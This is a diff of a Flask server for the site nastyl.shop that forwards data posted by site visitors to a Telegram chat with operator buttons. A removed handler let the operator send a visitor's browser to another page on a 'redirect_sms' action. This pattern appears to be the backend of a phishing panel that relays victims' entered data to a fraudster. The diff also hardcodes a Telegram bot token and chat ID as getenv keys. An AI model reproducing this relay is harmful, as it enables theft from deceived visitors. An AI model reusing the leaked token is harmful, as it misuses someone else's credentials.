@@ -1,24 +1,23 @@
-import eventlet
-eventlet.monkey_patch()
-
+import os
+import requests
+import time
 from flask import Flask, request, jsonify
 from flask_cors import CORS
 from flask_socketio import SocketIO
-import requests
-import time
-import os
 
 app = Flask(__name__)
-CORS(app, resources={r"/*": {"origins": ["https://www.nastyl.shop"]}})  # ✅ Разрешаем запросы только с nastyl.shop
+CORS(app, resources={r"/*": {"origins": ["https://www.nastyl.shop"]}})
 socketio = SocketIO(app, cors_allowed_origins="https://www.nastyl.shop")
 
-# 🔹 Telegram Bot Config
+# 🔹 Загружаем переменные окружения
 TELEGRAM_BOT_TOKEN = os.getenv("7368319072:AAGRGJU9NqchsjSMGHdVSrKGZEXYfyyRiUE")
-CHAT_ID = os.getenv("294154587")
+CHAT_ID = int(os.getenv("CHAT_ID", "0"))  # ✅ Принудительно приводим к int
+
+print(f"🔹 Загружен TELEGRAM_BOT_TOKEN: {TELEGRAM_BOT_TOKEN[:10]}...")
+print(f"🔹 Загружен CHAT_ID (тип {type(CHAT_ID)}): {CHAT_ID}")  # ✅ Проверяем, загружается ли CHAT_ID
 
 @app.route('/send-to-telegram', methods=['POST'])
 def send_to_telegram():
-    """Принимает данные от клиента и отправляет их в Telegram"""
     data = request.json
     user_id = str(int(time.time()))
 
@@ -37,55 +36,13 @@ def send_to_telegram():
         "reply_markup": keyboard
     }
 
-    print(f"📩 Отправляем запрос в Telegram: {payload}")  # ✅ Логируем перед отправкой
+    print(f"📩 Отправляем запрос в Telegram: {payload}")
 
     try:
         response = requests.post(telegram_url, json=payload)
-        print(f"📩 Ответ от Telegram: {response.status_code}, {response.text}")  # ✅ Логируем ответ
+        print(f"📩 Ответ от Telegram: {response.status_code}, {response.text}")
     except requests.exceptions.RequestException as e:
         print(f"❌ Ошибка при отправке запроса в Telegram: {e}")
         return jsonify({"error": "Ошибка при отправке в Telegram"}), 500
 
     return jsonify({"status": "✅ Данные отправлены оператору", "user_id": user_id})
-
-@app.route('/callback', methods=['POST'])
-def handle_callback():
-    """Обрабатывает нажатия кнопок оператором"""
-    data = request.json
-    print(f"📩 Получен callback от Telegram: {data}")
-
-    if "callback_query" not in data:
-        print("❌ Ошибка: В callback-запросе отсутствует 'callback_query'!")
-        return jsonify({"error": "callback_query отсутствует"}), 400
-
-    callback_query = data["callback_query"]
-    callback_data = callback_query.get("data")
-
-    if not callback_data:
-        print("❌ Ошибка: В callback-запросе отсутствует 'data'!")
-        return jsonify({"error": "Отсутствует data"}), 400
-
-    try:
-        action, user_id = callback_data.split(":")
-    except ValueError:
-        print("❌ Ошибка: Некорректный формат callback_data!")
-        return jsonify({"error": "Неверный формат callback_data"}), 400
-
-    if action == "redirect_sms":
-        print(f"✅ Оператор подтвердил редирект для пользователя {user_id}")
-        socketio.emit('redirect', {'user_id': user_id, 'url': "https://www.cikava-kava.com.ua/remont-stakanu-bojlera-kavomashyny-delonghi-pokrokovyj-gid/"})
-
-        telegram_url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
-        payload = {
-            "chat_id": callback_query["message"]["chat"]["id"],
-            "text": f"✅ Пользователь {user_id} будет перенаправлен!"
-        }
-
-        response = requests.post(telegram_url, json=payload)
-        print(f"📩 Ответ от Telegram: {response.status_code}, {response.text}")
-
-    return jsonify({"message": "✅ Редирект отправлен!"})
-
-if __name__ == "__main__":
-    print("🚀 Запуск Gunicorn...")
-    socketio.run(app, host="0.0.0.0", port=int(os.getenv("PORT", 5000)), allow_unsafe_werkzeug=True)
